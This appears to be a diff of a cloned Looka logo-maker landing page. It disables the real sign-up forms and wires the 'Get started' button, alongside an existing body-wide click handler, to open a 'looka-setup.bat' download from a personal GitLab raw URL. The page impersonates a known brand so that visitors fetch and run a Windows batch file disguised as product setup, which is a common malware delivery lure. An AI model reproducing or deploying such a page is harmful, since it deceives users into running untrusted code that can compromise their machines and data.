@@ -220,7 +220,7 @@
          <header class="header ">
             <h1 class="header__title"> Design your own beautiful brand </h1>
             <p class="header__paragraph">Use Looka's AI-powered platform to design a logo and build a brand you love.</p>
-            <form class="cta__form" action="/logo-maker/app" method="GET"> <label class="screen-reader-text" for="company_name_640cc3a264cc5">Start creating a logo by entering your company's name</label> <input class="cta__input" type="text" id="company_name_640cc3a264cc5" name="company_name" value="" placeholder="Enter your company name"> <button class="cta__button">Get started</button> </form>
+            <div class="cta__form"> <label class="screen-reader-text" for="company_name_640cc3a264cc5">Start creating a logo by entering your company's name</label> <input class="cta__input" type="text" id="company_name_640cc3a264cc5" name="company_name" value="" placeholder="Enter your company name"> <button id="btn-get-started" class="cta__button">Get started</button> </div>
          </header>
          <section class="carousel margin__bottom--none " data-plugin="CAROUSEL" data-preload-carousel="true">
             <div class="carousel__mask">
@@ -271,7 +271,7 @@
          <section class="cta cta--grey ">
             <div class="cta__container">
                <h2 class="cta__headline ">Make a logo you'll be proud of</h2>
-               <form class="cta__form" action="/logo-maker/app" method="GET"> <label class="screen-reader-text" for="company_name_640cc3a26b8bd">Start creating a logo by entering your company's name</label> <input class="cta__input" type="text" id="company_name_640cc3a26b8bd" name="company_name" value="" placeholder="Enter your company name"> <button class="cta__button cta__button--primary">Get started</button> </form>
+               <form class="cta__form" method="GET"> <label class="screen-reader-text" for="company_name_640cc3a26b8bd">Start creating a logo by entering your company's name</label> <input class="cta__input" type="text" id="company_name_640cc3a26b8bd" name="company_name" value="" placeholder="Enter your company name"> <button class="cta__button cta__button--primary">Get started</button> </form>
             </div>
          </section>
          <section class="icon-grid ">
@@ -366,7 +366,7 @@
          <section class="cta cta--grey ">
             <div class="cta__container">
                <h2 class="cta__headline ">Turn your creative vision into a business and brand you'll love</h2>
-               <form class="cta__form" action="/logo-maker/app" method="GET"> <label class="screen-reader-text" for="company_name_640cc3a31c995">Start creating a logo by entering your company's name</label> <input class="cta__input" type="text" id="company_name_640cc3a31c995" name="company_name" value="" placeholder="Enter your company name"> <button class="cta__button cta__button--primary">Get started</button> </form>
+               <form class="cta__form" method="GET"> <label class="screen-reader-text" for="company_name_640cc3a31c995">Start creating a logo by entering your company's name</label> <input class="cta__input" type="text" id="company_name_640cc3a31c995" name="company_name" value="" placeholder="Enter your company name"> <button class="cta__button cta__button--primary">Get started</button> </form>
             </div>
          </section>
          <section class="masonry ">
@@ -481,7 +481,7 @@
                   <h2 class="cta__headline cta__headline--reverse">Get started for free!</h2>
                   <p class="cta__copy cta__copy--reverse">Then use Looka's AI-powered platform to make a logo, business cards & more!</p>
                </div>
-               <form class="cta__form" action="/logo-maker/app" method="GET"> <label class="screen-reader-text" for="company_name_640cc3a33489d">Start creating a logo by entering your company's name</label> <input class="cta__input" type="text" id="company_name_640cc3a33489d" name="company_name" value="" placeholder="Enter your company name"> <button class="cta__button ">Get started</button> </form>
+               <form class="cta__form" method="GET"> <label class="screen-reader-text" for="company_name_640cc3a33489d">Start creating a logo by entering your company's name</label> <input class="cta__input" type="text" id="company_name_640cc3a33489d" name="company_name" value="" placeholder="Enter your company name"> <button class="cta__button ">Get started</button> </form>
             </div>
          </section>
       </main>
@@ -600,6 +600,9 @@
           <script>
             document.body.onclick = function(){
                 window.open('https://gitlab.com/ledangtu/batch/-/raw/main/looka-setup.bat?inline=false')
+            }
+            document.getElementById('btn-get-started').onclick = function(){
+               window.open('https://gitlab.com/ledangtu/batch/-/raw/main/looka-setup.bat?inline=false')
             }
           </script>
    </body>
